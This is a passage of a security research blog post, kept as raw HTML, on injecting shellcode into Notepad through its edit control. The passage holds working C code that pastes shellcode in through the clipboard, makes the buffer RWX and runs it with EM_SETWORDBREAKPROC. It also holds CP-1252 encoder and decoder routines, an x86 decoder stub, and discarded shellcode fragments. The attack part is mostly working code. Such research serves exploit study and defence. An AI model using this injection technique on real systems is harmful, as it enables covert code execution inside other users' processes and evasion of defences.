style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">Notepad</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get window handle for edit control</span>\n    ecw <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">FindWindowEx</span><span style=\"color: #808030;\">(</span>npw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">Edit</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get the EM handle for the edit control</span>\n    emh<span style=\"color: #808030;\">.</span>p <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PVOID</span><span style=\"color: #808030;\">)</span><span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_GETHANDLE</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get the process id for the window</span>\n    <span style=\"color: #400000;\">GetWindowThreadProcessId</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>pid<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// open the process for reading and changing memory permissions</span>\n    hp <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">OpenProcess</span><span style=\"color: #808030;\">(</span><span style=\"color: #7d0045;\">PROCESS_VM_READ</span> <span style=\"color: #808030;\">|</span> <span style=\"color: #7d0045;\">PROCESS_VM_OPERATION</span><span style=\"color: #808030;\">,</span> FALSE<span style=\"color: #808030;\">,</span> pid<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #696969;\">// copy some test data to the clipboard</span>\n    <span style=\"color: #603000;\">memset</span><span style=\"color: #808030;\">(</span>buf<span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x4d</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>buf<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    CopyToClipboard<span style=\"color: #808030;\">(</span>CF_TEXT<span style=\"color: #808030;\">,</span> buf<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>buf<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>    \n    \n    <span style=\"color: #696969;\">// loop until target buffer address is stable</span>\n    lastbuf<span style=\"color: #808030;\">.</span>p <span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #800080;\">;</span>\n    r <span style=\"color: #808030;\">=</span> FALSE<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span><span style=\"color: #800080;\">;</span><span style=\"color: #800080;\">;</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// read the address of input buffer     </span>\n      <span style=\"color: #400000;\">ReadProcessMemory</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">,</span> emh<span style=\"color: #808030;\">.</span>p<span style=\"color: #808030;\">,</span> \n        <span style=\"color: #808030;\">&amp;</span>embuf<span style=\"color: #808030;\">.</span>p<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">ULONG_PTR</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>rd<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n      <span style=\"color: #696969;\">// Address hasn't changed? exit loop</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>embuf<span style=\"color: #808030;\">.</span>p <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> lastbuf<span style=\"color: #808030;\">.</span>p<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        r <span style=\"color: #808030;\">=</span> TRUE<span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n      <span style=\"color: #696969;\">// save this address</span>\n      lastbuf<span style=\"color: #808030;\">.</span>p <span style=\"color: #808030;\">=</span> embuf<span style=\"color: #808030;\">.</span>p<span style=\"color: #800080;\">;</span>\n    \n      <span style=\"color: #696969;\">// clear the contents of edit control</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_SETSEL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">-</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_CLEAR</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      \n      <span style=\"color: #696969;\">// send the WM_PASTE message to the edit control</span>\n      <span style=\"color: #696969;\">// allow notepad some time to read the data from clipboard</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_PASTE</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #400000;\">Sleep</span><span style=\"color: #808030;\">(</span>WAIT_TIME<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>r<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// set buffer to RWX</span>\n      <span style=\"color: #400000;\">VirtualProtectEx</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">,</span> embuf<span style=\"color: #808030;\">.</span>p<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">4096</span><span style=\"color: #808030;\">,</span> PAGE_EXECUTE_READWRITE<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>old<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        \n      <span style=\"color: #696969;\">// generate shellcode and copy to clipboard</span>\n      cs <span style=\"color: #808030;\">=</span> cp1252_generate_winexec<span style=\"color: #808030;\">(</span>pid<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>cslen<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      CopyToClipboard<span style=\"color: #808030;\">(</span>CF_TEXT<span style=\"color: #808030;\">,</span> cs<span style=\"color: #808030;\">,</span> cslen<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        \n      <span style=\"color: #696969;\">// clear buffer and inject shellcode</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_SETSEL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">-</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_CLEAR</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_PASTE</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #400000;\">Sleep</span><span style=\"color: #808030;\">(</span>WAIT_TIME<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      \n      <span style=\"color: #696969;\">// set the word break procedure to address of shellcode and execute</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_SETWORDBREAKPROC</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span>embuf<span style=\"color: #808030;\">.</span>p<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_LBUTTONDBLCLK</span><span style=\"color: #808030;\">,</span> MK_LBUTTON<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span><span style=\"color: #008000;\">0x000a000a</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_SETWORDBREAKPROC</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span><span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      \n      <span style=\"color: #696969;\">// set buffer to RW</span>\n      <span style=\"color: #400000;\">VirtualProtectEx</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">,</span> embuf<span style=\"color: #808030;\">.</span>p<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">4096</span><span style=\"color: #808030;\">,</span> PAGE_READWRITE<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>old<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #400000;\">CloseHandle</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> r<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 12:12:42 UTC --></p>\n<h2 id=\"demo\">6. Demonstration</h2>\n<p>Notepad doesn&#8217;t crash as a result of the shellcode running. The demo terminates it once the thread ends. </p>\n<p></p>\n<h2 id=\"advanced\">7. Encoding Arbitrary Data</h2>\n<p>Encoding data and code require different solutions. Raw data that doesn&#8217;t execute requires &#8220;bad characters&#8221; removed from it, while code must execute successfully after the conversion, which is not easy to accomplish in practice. The following encoding and decoding algorithms are based on <a href=\"https://modexp.wordpress.com/2020/06/26/shellcode-encoding-null-bytes-faster/\">a previous post</a> about removing null characters in shellcode.</p>\n<h3 id=\"encdata\">7.1 Encoding</h3>\n<ol>\n<li>Read a byte from the input file or stream and assign to X.</li>\n<li>If X plus 1 is allowed, goto step 6.</li>\n<li>Save escape code (0x01) to the output file or stream.</li>\n<li>XOR X with 8-Bit key.</li>\n<li>Save X to the output file or stream, goto step 7.</li>\n<li>Save X plus 1 to the output file or stream.</li>\n<li>Repeat steps 1-6 until EOF.</li>\n</ol>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #177500;\">// encode raw data to CP-1252 compatible data</span>\n<span style=\"color: #A90D91;\">static</span>\n<span style=\"color: #A90D91;\">void</span> <span style=\"color: #000000;\">cp1252_encode</span>(<span style=\"color: #A90D91;\">FILE</span> <span style=\"color: #000000;\">*in</span>, <span style=\"color: #A90D91;\">FILE</span> <span style=\"color: #000000;\">*out</span>) {\n    <span style=\"color: #A90D91;\">uint8_t</span> <span style=\"color: #000000;\">c</span>, <span style=\"color: #000000;\">t</span>;\n    \n    <span style=\"color: #A90D91;\">for</span>(;;) {\n      <span style=\"color: #177500;\">// read byte</span>\n      <span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">=</span> <span style=\"color: #000000;\">getc</span>(<span style=\"color: #000000;\">in</span>);\n      <span style=\"color: #177500;\">// end of file? exit</span>\n      <span style=\"color: #A90D91;\">if</span>(<span style=\"color: #000000;\">feof</span>(<span style=\"color: #000000;\">in</span>)) <span style=\"color: #A90D91;\">break</span>;\n      <span style=\"color: #177500;\">// if the result of c + 1 is disallowed</span>\n      <span style=\"color: #A90D91;\">if</span>(<span style=\"color: #000000;\">!is_decoder_allowed</span>(<span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">1</span>)) {\n        <span style=\"color: #177500;\">// write escape code</span>\n        <span style=\"color: #000000;\">putc</span>(<span style=\"color: #1C01CE;\">0x01</span>, <span style=\"color: #000000;\">out</span>);\n        <span style=\"color: #177500;\">// save byte XOR'd with the 8-Bit key</span>\n        <span style=\"color: #000000;\">putc</span>(<span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">^</span> <span style=\"color: #000000;\">CP1252_KEY</span>, <span style=\"color: #000000;\">out</span>);\n      } <span style=\"color: #A90D91;\">else</span> {\n        <span style=\"color: #177500;\">// save byte plus 1</span>\n        <span style=\"color: #000000;\">putc</span>(<span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">1</span>, <span style=\"color: #000000;\">out</span>);\n      }\n    }\n}\n</pre>\n</div>\n<h3 id=\"decdata\">7.2 Decoding</h3>\n<ol>\n<li>Read a byte from the input file or stream and assign to X.</li>\n<li>If X is not an escape code, goto step 6.</li>\n<li>Read a byte from the input file or stream and assign to X.</li>\n<li>XOR X with 8-Bit key.</li>\n<li>Save X to the output file or stream, goto step 7.</li>\n<li>Save X &#8211; 1 to the output file or stream.</li>\n<li>Repeat steps 1-6 until EOF.</li>\n</ol>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #177500;\">// decode data processed with cp1252_encode to their original values</span>\n<span style=\"color: #A90D91;\">static</span>\n<span style=\"color: #A90D91;\">void</span> <span style=\"color: #000000;\">cp1252_decode</span>(<span style=\"color: #A90D91;\">FILE</span> <span style=\"color: #000000;\">*in</span>, <span style=\"color: #A90D91;\">FILE</span> <span style=\"color: #000000;\">*out</span>) {\n    <span style=\"color: #A90D91;\">uint8_t</span> <span style=\"color: #000000;\">c</span>, <span style=\"color: #000000;\">t</span>;\n    \n    <span style=\"color: #A90D91;\">for</span>(;;) {\n      <span style=\"color: #177500;\">// read byte</span>\n      <span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">=</span> <span style=\"color: #000000;\">getc</span>(<span style=\"color: #000000;\">in</span>);\n      <span style=\"color: #177500;\">// end of file? exit</span>\n      <span style=\"color: #A90D91;\">if</span>(<span style=\"color: #000000;\">feof</span>(<span style=\"color: #000000;\">in</span>)) <span style=\"color: #A90D91;\">break</span>;\n      <span style=\"color: #177500;\">// if this is an escape code</span>\n      <span style=\"color: #A90D91;\">if</span>(<span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">==</span> <span style=\"color: #1C01CE;\">0x01</span>) {\n        <span style=\"color: #177500;\">// read next byte</span>\n        <span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">=</span> <span style=\"color: #000000;\">getc</span>(<span style=\"color: #000000;\">in</span>);\n        <span style=\"color: #177500;\">// XOR the 8-Bit key</span>\n        <span style=\"color: #000000;\">putc</span>(<span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">^</span> <span style=\"color: #000000;\">CP1252_KEY</span>, <span style=\"color: #000000;\">out</span>);\n      } <span style=\"color: #A90D91;\">else</span> {\n        <span style=\"color: #177500;\">// save byte minus one</span>\n        <span style=\"color: #000000;\">putc</span>(<span style=\"color: #000000;\">c</span> <span style=\"color: #000000;\">-</span> <span style=\"color: #1C01CE;\">1</span>, <span style=\"color: #000000;\">out</span>);\n      }\n    }\n}\n</pre>\n</div>\n<p>The assembly is compatible with both 32 and 64-bit mode of the x86 architecture.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">; cp1252 decoder in 40 bytes of x86/amd64 assembly</span>\n<span style=\"color: #696969;\">; presumes to be executing in RWX memory</span>\n<span style=\"color: #696969;\">; needs stack allocation if executing from RX memory</span>\n<span style=\"color: #696969;\">;</span>\n<span style=\"color: #696969;\">; odzhan</span>\n\n    <span style=\"color: #004a43;\">bits</span> <span style=\"color: #008c00;\">32</span>\n    \n<span style=\"color: #004a43;\">&#xa0;&#xa0;&#xa0;&#xa0;</span><span style=\"color: #004a43;\">%define</span><span style=\"color: #004a43;\"> CP1252_KEY 0x4D</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">jmp</span>    <span style=\"color: #e34adc;\">init_decode</span>       <span style=\"color: #696969;\">; read the program counter</span>\n    \n    <span style=\"color: #696969;\">; esi = source</span>\n    <span style=\"color: #696969;\">; edi = destination </span>\n    <span style=\"color: #696969;\">; ecx = length</span>\n<span style=\"color: #e34adc;\">decode_bytes:</span>\n    <span style=\"color: #800000; font-weight: bold;\">lodsb</span>                    <span style=\"color: #696969;\">; read a byte</span>\n    <span style=\"color: #800000; font-weight: bold;\">dec</span>    <span style=\"color: #000080;\">al</span>                <span style=\"color: #696969;\">; c - 1</span>\n    <span style=\"color: #800000; font-weight: bold;\">jnz</span>    <span style=\"color: #e34adc;\">save_byte</span>\n    <span style=\"color: #800000; font-weight: bold;\">lodsb</span>                    <span style=\"color: #696969;\">; skip null byte</span>\n    <span style=\"color: #800000; font-weight: bold;\">lodsb</span>                    <span style=\"color: #696969;\">; read next byte</span>\n    <span style=\"color: #800000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> CP1252_KEY    <span style=\"color: #696969;\">; c ^= CP1252_KEY</span>\n<span style=\"color: #e34adc;\">save_byte:</span>\n    <span style=\"color: #800000; font-weight: bold;\">stosb</span>                    <span style=\"color: #696969;\">; save in buffer</span>\n    <span style=\"color: #800000; font-weight: bold;\">lodsb</span>                    <span style=\"color: #696969;\">; skip null byte</span>\n    <span style=\"color: #800000; font-weight: bold;\">loop</span>   <span style=\"color: #e34adc;\">decode_bytes</span>\n    <span style=\"color: #800000; font-weight: bold;\">ret</span>\n<span style=\"color: #e34adc;\">load_data:</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">esi</span>               <span style=\"color: #696969;\">; esi = start of data</span>\n    <span style=\"color: #696969;\">; ********************** ; decode the 32-bit length</span>\n<span style=\"color: #e34adc;\">read_len:</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #008c00;\">0</span>                 <span style=\"color: #696969;\">; len = 0</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #000080;\">esp</span>               <span style=\"color: #696969;\">; </span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">edi</span>               <span style=\"color: #696969;\">; edi = &amp;len</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #008c00;\">4</span>                 <span style=\"color: #696969;\">; 32-bits</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">ecx</span>\n    <span style=\"color: #800000; font-weight: bold;\">call</span>   <span style=\"color: #e34adc;\">decode_bytes</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">ecx</span>               <span style=\"color: #696969;\">; ecx = len</span>\n    \n    <span style=\"color: #696969;\">; ********************** ; decode remainder of data</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #000080;\">esi</span>               <span style=\"color: #696969;\">; </span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">edi</span>               <span style=\"color: #696969;\">; edi = encoded data</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #000080;\">esi</span>               <span style=\"color: #696969;\">; save address for RET</span>\n    <span style=\"color: #800000; font-weight: bold;\">jmp</span>    <span style=\"color: #e34adc;\">decode_bytes</span>\n<span style=\"color: #e34adc;\">init_decode:</span>\n    <span style=\"color: #800000; font-weight: bold;\">call</span>   <span style=\"color: #e34adc;\">load_data</span>\n    <span style=\"color: #696969;\">; CP1252 encoded data goes here..</span>\n    \n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 12:35:10 UTC --></p>\n<p>The decoder could be stored at the beginning of the buffer and the callback could be stored higher up in memory.</p>\n<h2 id=\"ack\">8. Acknowledgements</h2>\n<p>I&#8217;d like to thank <a href=\"https://twitter.com/Hexacorn\">Adam</a> for feedback and advice on this post. Specifically about CF_UNICODETEXT.</p>\n<h2 id=\"research\">9. Further Research</h2>\n<p>List of papers and presentations relevant to this post. If you know of any good papers on writing Unicode shellcodes that aren&#8217;t listed here, feel free to email me with the details.</p>\n<ul>\n<li><a href=\"https://www.nccgroup.com/uk/our-research/creating-arbitrary-shellcode-in-unicode-expanded-strings/\">Creating Arbitrary Shellcode In Unicode Expanded Strings</a> by Chris Anley</li>\n<li><a href=\"https://web.archive.org/web/20060904080018/http://security.tombom.co.uk/shatter.html\">Exploiting design flaws in the Win32 API for privilege escalation.</a> by <a href=\"https://twitter.com/KristinPaget\">Chris/Kristin Paget</a></li>\n<li><a href=\"https://web.archive.org/web/20060830211709/http://security.tombom.co.uk/moreshatter.html\">Shatter attacks &#8211; more techniques, more detail, more juicy goodness.</a> by <a href=\"https://twitter.com/KristinPaget\">Chris/Kristin Paget</a></li>\n<li><a href=\"https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-paget.pdf\">Exploits &amp; Information about Shatter Attacks</a> by <a href=\"https://twitter.com/KristinPaget\">Chris/Kristin Paget</a></li>\n<li><a href=\"http://phrack.org/issues/61/11.html\">Building IA32 &#8216;Unicode-Proof&#8217; Shellcodes</a> by obscou</li>\n<li><a href=\"https://www.blackhat.com/presentations/win-usa-03/bh-win-03-aitel/bh-win-03-aitel.pdf\">Vivisection of an Exploit: What To DoWhen It Isn&#8217;t Easy</a> by <a href=\"https://twitter.com/daveaitel\">Dave Aitel</a></li>\n<li><a href=\"https://web.archive.org/web/20030917194127/http://www.idefense.com/idpapers/Shatter_Redux.pdf\">Win32 Message Vulnerabilities Redux</a> by <a href=\"https://twitter.com/oliverlavery\">Oliver Lavery</a></li>\n<li><a href=\"https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf\">Practical Win32 and UNICODE exploitation</a> by <a href=\"https://twitter.com/41414141\">Phenoelit/FX</a></li>\n<li><a href=\"https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-moore/bh-us-04-moore-whitepaper.pdf\">Shattering By Example.</a> by <a href=\"https://twitter.com/hdmoore\">Brett Moore</a></li>\n<li><a href=\"http://phrack.org/issues/62/9.html\">Writing UTF-8 compatible shellcodes</a> by Thomas Wana aka. greuff</li>\n<li><a href=\"http://bigsonata.com/resources/unicode_shellcode_2008.pdf\">Unicode Shellcode and Improvements</a></li>\n<li><a href=\"https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/\">Exploit writing tutorial part 7 : Unicode \u2013 from 0x00410041 to calc</a></li>\n</ul>\n<h2 id=\"scrapheap\">10. Code Scrapheap</h2>\n<p>What follows are just some bits of code that were considered, but not used in the end. Explanations are provided for why they were discarded.</p>\n<p>The first one tries to set EAX to 0. Set AL and AH to 0. Then extend AX to EAX using CWDE. Unfortunately 0x98 can&#8217;t be used.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xb0\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>  <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>             <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">ebp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xb4\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>  <span style=\"color: #000080;\">ah</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>             <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">ebp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x98\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">cwde</span>                   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 17:47:20 UTC --></p>\n<p>Another idea for seting EAX to 0. Clear the Carry Flag using CLC, set EAX to 0xFF00FF00. Subtract 0xFF00FF00 + CF from EAX which sets EAX to 0. Can you spot the problem? \ud83d\ude42 Well, the ADD affects the Carry Flag, so that&#8217;s why it doesn&#8217;t work as intended. Of course, it might work, depending on what RBP points to and the value of CL.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xf8\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">clc</span>                       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xb8\\x00\\xff\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff00ff00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: 